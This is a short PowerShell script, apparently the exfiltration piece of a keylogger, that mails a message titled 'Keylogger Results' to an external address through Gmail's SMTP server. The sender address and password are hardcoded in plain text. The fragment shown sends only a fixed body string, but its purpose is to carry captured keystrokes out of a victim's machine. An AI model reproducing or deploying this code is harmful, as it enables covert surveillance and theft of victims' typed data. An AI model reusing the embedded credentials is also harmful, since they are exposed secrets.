$From = "madman1237890026525@gmail.com"
$Pass = "Madman009"
$To = "madman1237890026525@gmail.com"
$Subject = "Keylogger Results"
$body = "Keylogger Results"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)


send-mailmessage -from $from -to $to -subject $Subject -body $body -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl

